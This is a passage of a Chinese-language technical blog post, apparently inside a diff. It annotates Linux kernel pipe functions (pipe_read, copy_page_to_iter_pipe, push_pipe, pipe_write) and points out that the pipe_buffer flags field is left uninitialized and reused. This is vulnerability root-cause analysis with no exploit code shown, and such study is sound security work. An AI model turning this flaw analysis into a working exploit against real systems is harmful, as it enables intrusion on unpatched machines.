class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> head = pipe-&gt;head;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tail = pipe-&gt;tail;</span><br><span class="line">    <span class="comment">// 注意 pipe-&gt;ring_size 为 2的幂，因此 ring_size-1 转成二进制为 0b1111...111</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 如果管道中存在数据</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe_empty(head, tail)) &#123;</span><br><span class="line">        <span class="comment">// 获取 head 所对应的 pipe_buffer，注意 head 的范围可以大于 max_usage，因为整个 pipe_buffer 的设计就是把它当作一个环</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> = &amp;<span class="title">pipe</span>-&gt;<span class="title">bufs</span>[<span class="title">tail</span> &amp; <span class="title">mask</span>];</span></span><br><span class="line">        <span class="comment">// 获取当前读取的 buf 数据大小</span></span><br><span class="line">        <span class="keyword">size_t</span> chars = buf-&gt;len;</span><br><span class="line">        <span class="keyword">size_t</span> written;</span><br><span class="line">        <span class="keyword">int</span> error;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 如果当前可读取的 buf 大小大于 需要读入的大小，则截断</span></span><br><span class="line">        <span class="keyword">if</span> (chars &gt; total_len)</span><br><span class="line">            chars = total_len;</span><br><span class="line">        <span class="comment">// 调用 pipe_buf 的 confirm 方法，确保 pipe buffer 中的数据有效</span></span><br><span class="line">        error = pipe_buf_confirm(pipe, buf);</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ret)</span><br><span class="line">                ret = error;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 将当前 pipe buffer 所对应的内存页，写入 to 中</span></span><br><span class="line">        written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line">        <span class="comment">// 如果写入大小 &lt; 可写大小，则说明在写入数据时出现不可恢复的错误，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(written &lt; chars)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ret)</span><br><span class="line">                ret = -EFAULT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 一轮读取完成，如果带读取大小仍然不为0，则准备继续循环读取</span></span><br><span class="line">        ret += chars;</span><br><span class="line">        buf-&gt;offset += chars;</span><br><span class="line">        buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Was it a packet buffer? Clean up and exit */</span></span><br><span class="line">        <span class="comment">// 若引用该 pipe 的 fd 设置了 O_DIRECT 标志，这个标志可以在 pipe_write 函数中看看是怎么使用的</span></span><br><span class="line">        <span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;</span><br><span class="line">            total_len = chars;</span><br><span class="line">            buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果当前 pipe buffer 已经全部读取完成，则更新 tail 至下一个 pipe buffer</span></span><br><span class="line">        <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">            pipe_buf_release(pipe, buf);</span><br><span class="line">            spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">            tail++;</span><br><span class="line">            pipe-&gt;tail = tail;</span><br><span class="line">            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">        &#125;</span><br><span class="line">        total_len -= chars;</span><br><span class="line">        <span class="comment">// 如果正常读取完，则直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (!total_len)</span><br><span class="line">            <span class="keyword">break</span>;    <span class="comment">/* common path: read succeeded */</span></span><br><span class="line">        <span class="comment">// 如果还需要读取数据，并且管道里确实还有数据，则循环读取</span></span><br><span class="line">        <span class="keyword">if</span> (!pipe_empty(head, tail))    <span class="comment">/* More to do? */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">        ret = -EAGAIN;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * We only get here if we didn't actually read anything.</span></span><br><span class="line"><span class="comment">         * ...</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br><span class="line">...;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure>
+<h3 id="3-copy-page-to-iter-相关">3. copy_page_to_iter 相关</h3>
+<p>从函数 pipe_buffer 的注释中可以得知大致的读取 pipe 的流程。其中 <code>copy_page_to_iter</code> 函数会根据变量 <code>to</code> 的内部字段 <code>type</code> 来选择执行不同的操作：</p>
+<blockquote>
+<p>不过总体上的功能，还是将传入的 page 复制进 iov_iter 所指向的位置。</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/linux/uio.h</span></span><br><span class="line"><span class="keyword">static</span> __always_inline __must_check</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">copy_to_iter</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">size_t</span> bytes, struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!check_copy_size(addr, bytes, <span class="literal">true</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> _copy_to_iter(addr, bytes, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// lib/iov_iter.c</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">copy_page_to_iter</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="function"><span class="params">             struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 判断数据读写是否越界，通常这个 check 肯定是可以通过的</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!page_copy_sane(page, offset, bytes)))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (i-&gt;type &amp; (ITER_BVEC|ITER_KVEC)) &#123;</span><br><span class="line">        <span class="keyword">void</span> *kaddr = kmap_atomic(page);</span><br><span class="line">        <span class="keyword">size_t</span> wanted = copy_to_iter(kaddr + offset, bytes, i);</span><br><span class="line">        kunmap_atomic(kaddr);</span><br><span class="line">        <span class="keyword">return</span> wanted;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(iov_iter_is_discard(i)))</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (likely(!iov_iter_is_pipe(i))) </span><br><span class="line">        <span class="keyword">return</span> copy_page_to_iter_iovec(page, offset, bytes, i);</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// (i-&gt;type &amp; ~(READ | WRITE)) == ITER_PIPE</span></span><br><span class="line">        <span class="keyword">return</span> copy_page_to_iter_pipe(page, offset, bytes, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们只关注当 <code>to</code> 也为一个 pipe 时，数据是如何复制的，即 <code>copy_page_to_iter_pipe</code> 函数。整个函数其实很短：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="function"><span class="params">             struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取待写入的 pipe 结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> = <span class="title">i</span>-&gt;<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">    <span class="comment">// 获取待写入的 pipe 结构体的一些信息，例如 head、tail等等 </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line">    <span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里是在做一些 check</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">        bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sanity(i))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取待写入的相对偏移位置</span></span><br><span class="line">    off = i-&gt;iov_offset;</span><br><span class="line">    <span class="comment">// 获取待接收数据的 pipe buf</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">    <span class="keyword">if</span> (off) &#123;</span><br><span class="line">        <span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line">            <span class="comment">/* merge with the last one */</span></span><br><span class="line">            buf-&gt;len += bytes;</span><br><span class="line">            i-&gt;iov_offset += bytes;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        i_head++;</span><br><span class="line">        buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果待写入的管道已满，则直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">    <span class="comment">// 增加该页的 refcount</span></span><br><span class="line">    get_page(page);</span><br><span class="line">    buf-&gt;page = page;   <span class="comment">// 直接引用已有的页</span></span><br><span class="line">    buf-&gt;offset = offset;</span><br><span class="line">    buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">    pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">    i-&gt;iov_offset = offset + bytes;</span><br><span class="line">    i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">    i-&gt;count -= bytes;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单讲下其中的关键：对于 recv pipe buf 来说，当有新的 page 数据复制到 recv pipe buf 上时，<strong>recv pipe buf 将直接引用该页</strong>，并记录下当前复制的 offset、len 等等，以降低性能开销。如果每次复制的都是不同的页，那 recv pipe bufs 上存放的就是不同页的引用，其中每页的 offset 和 len 可能不会饱和。</p>
+<p>注意：由于这里 pipe buf 是<strong>直接引用其他页</strong>，因此在 page_write 处<strong>必须确保新传来的数据不会写入这样的页面</strong>中，而这种保证就依赖于 MERGE 标志。</p>
+<p>在这里我们可以看到一个有意思的事情：<strong>虽然 recv pipe buf 结构体上的众多字段都被重新赋值，但有一个字段却被遗漏了，那就是 flags 字段</strong>！</p>
+<h3 id="4-copy-to-iter-相关">4. copy_to_iter 相关</h3>
+<p>除了 pipe_read 调用 <code>copy_page_to_iter</code> 函数，进而调用到 <code>copy_page_to_iter</code> 函数来<strong>传递数据至 pipe</strong> 以外，<code>copy_to_iter</code> 函数也可以用于 pipe 的数据传递：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline __must_check</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">copy_to_iter</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">size_t</span> bytes, struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!check_copy_size(addr, bytes, <span class="literal">true</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> _copy_to_iter(addr, bytes, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> _copy_to_iter(<span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">size_t</span> bytes, struct iov_iter *i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *from = addr;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(iov_iter_is_pipe(i))) <span class="comment">// pipe case</span></span><br><span class="line">        <span class="keyword">return</span> copy_pipe_to_iter(addr, bytes, i);</span><br><span class="line">    <span class="keyword">if</span> (iter_is_iovec(i))</span><br><span class="line">        might_fault();</span><br><span class="line">    iterate_and_advance(i, bytes, v,</span><br><span class="line">        copyout(v.iov_base, (from += v.iov_len) - v.iov_len, v.iov_len),</span><br><span class="line">        memcpy_to_page(v.bv_page, v.bv_offset,</span><br><span class="line">                   (from += v.bv_len) - v.bv_len, v.bv_len),</span><br><span class="line">        <span class="built_in">memcpy</span>(v.iov_base, (from += v.iov_len) - v.iov_len, v.iov_len)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>copy_to_iter 函数有很多个调用点，因此大概率存在某个调用点是通过 <code>copy_to_iter</code> 函数来向 pipe 中写入数据。这样一来控制流变可以通过 <code>copy_to_iter-&gt; _copy_to_iter -&gt; copy_pipe_to_iter</code> 来调用到真正执行数据拷贝的操作：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_pipe_to_iter</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="function"><span class="params">                struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取 pipe 结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> = <span class="title">i</span>-&gt;<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i_head;</span><br><span class="line">    <span class="keyword">size_t</span> n, off;</span><br><span class="line">    <span class="comment">// 执行 check</span></span><br><span class="line">    <span class="keyword">if</span> (!sanity(i))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  从代码中可以推测该函数的功能：</span></span><br><span class="line"><span class="comment">        1. 获取可写入管道的大小（管道可能不够大）</span></span><br><span class="line"><span class="comment">        2. 准备待写入管道的一些 pipe_buf</span></span><br><span class="line"><span class="comment">        3. 获取当前管道的 head 位置</span></span><br><span class="line"><span class="comment">        4. 获取当前 pipe 可写页位置的相对偏移 off</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// n 为待写入数据字节大小</span></span><br><span class="line">    bytes = n = push_pipe(i, bytes, &amp;i_head, &amp;off);</span><br><span class="line">    <span class="comment">// 如果没有数据需要写入，则直接返回。通常这个分支不大可能会触发。</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!n))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 循环写入管道，直到待写入的数据全部写完。每写一次时，要么写完一整页，要么没写完一页就直接退出</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 获取单次可写入的大小</span></span><br><span class="line">        <span class="keyword">size_t</span> chunk = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, n, PAGE_SIZE - off);</span><br><span class="line">        memcpy_to_page(pipe-&gt;bufs[i_head &amp; p_mask].page, off, addr, chunk);</span><br><span class="line">        i-&gt;head = i_head;</span><br><span class="line">        i-&gt;iov_offset = off + chunk;</span><br><span class="line">        n -= chunk;</span><br><span class="line">        addr += chunk;</span><br><span class="line">        off = <span class="number">0</span>;</span><br><span class="line">        i_head++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (n);</span><br><span class="line">    <span class="comment">// 修改当前 iov_iter 待写入的大小</span></span><br><span class="line">    i-&gt;count -= bytes;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来我们再来看看函数 <code>push_pipe</code>，从上面的注解我们也可得知这个函数是比较重要的：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">push_pipe</span><span class="params">(struct iov_iter *i, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">int</span> *iter_headp, <span class="keyword">size_t</span> *offp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取接收数据的 pipe</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> = <span class="title">i</span>-&gt;<span class="title">pipe</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> iter_head;</span><br><span class="line">    <span class="keyword">size_t</span> off;</span><br><span class="line">    <span class="keyword">ssize_t</span> left;</span><br><span class="line">    <span class="comment">// 一些常规 check 暂且不表</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(size &gt; i-&gt;count))</span><br><span class="line">        size = i-&gt;count;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!size))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    left = size;</span><br><span class="line">    <span class="comment">/* data_start 获取 pipe 的 head &amp; 起始 offset。</span></span><br><span class="line"><span class="comment">       这个函数用于过滤 head 指向上一个未被分配的 pipe buf 或者 offset == PAGE_SIZE 的情况 */</span></span><br><span class="line">    data_start(i, &amp;iter_head, &amp;off);</span><br><span class="line">    *iter_headp = iter_head;</span><br><span class="line">    *offp = off;</span><br><span class="line">    <span class="comment">// 如果当前是从某个页的中间位置开始写</span></span><br><span class="line">    <span class="keyword">if</span> (off) &#123;</span><br><span class="line">        <span class="comment">// 判断这剩余半页够不够写</span></span><br><span class="line">        left -= PAGE_SIZE - off;</span><br><span class="line">        <span class="comment">// 要是够写则直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (left &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            pipe-&gt;bufs[iter_head &amp; p_mask].len += size;</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果不够写则先把该可写的半页，扩充为可写的整页</span></span><br><span class="line">        pipe-&gt;bufs[iter_head &amp; p_mask].len = PAGE_SIZE;</span><br><span class="line">        iter_head++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 到这里时，则循环扩充页</span></span><br><span class="line">    <span class="keyword">while</span> (!pipe_full(iter_head, p_tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">        <span class="comment">// 循环获取 pipe_buffer，并初始化 pipe_buffer 结构体上的数据</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> = &amp;<span class="title">pipe</span>-&gt;<span class="title">bufs</span>[<span class="title">iter_head</span> &amp; <span class="title">p_mask</span>];</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> = <span class="title">alloc_page</span>(<span class="title">GFP_USER</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (!page)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        buf-&gt;ops = &amp;default_pipe_buf_ops;</span><br><span class="line">        buf-&gt;page = page;</span><br><span class="line">        buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">        buf-&gt;len = <span class="keyword">min_t</span>(<span class="keyword">ssize_t</span>, left, PAGE_SIZE);</span><br><span class="line">        left -= buf-&gt;len;</span><br><span class="line">        <span class="comment">/* !!! 需要注意的是，这里没有对 buf 的 flag 字段初始化！因此这里的 flag 字段将沿用旧的 pipe_buffer 的 flag*/</span></span><br><span class="line">        iter_head++;</span><br><span class="line">        pipe-&gt;head = iter_head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (left == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> size - left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从 <code>push_pipe</code> 函数中我们可以看到，当 kernel 循环扩充 pipe_buffer 上的页时，这里也<strong>并没有初始化 pipe_buffer 的 flag 标志</strong>！又因为 pipe_buffer 在设计上便是一个环，因此在扩孔 pipe_buffer 时，这里也<strong>将重用先前 pipe_buffer 所设置的 flag</strong>。</p>
+<blockquote>
+<p>这里简单总结一下 copy_page_to_iter 函数与 copy_to_iter 函数在<strong>复制数据进 pipe 时</strong> 所实现的差异：</p>
+<ul>
+<li>前者是在一个完整 page 上，将数据复制给 pipe。因此 pipe buf 只需直接引用该页，并记录下 offset 和 len，即可完成复制操作。</li>
+<li>后者不保证源数据在完整 page 上，而是提供了 addr 和 len，因此 pipe buf 需要自己准备存放数据的 page。</li>
+</ul>
+</blockquote>
+<h3 id="5-pipe-write-函数">5. pipe_write 函数</h3>
+<p>这次我们只关注最精华的两部分，首先是 <strong>页合并</strong>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> = 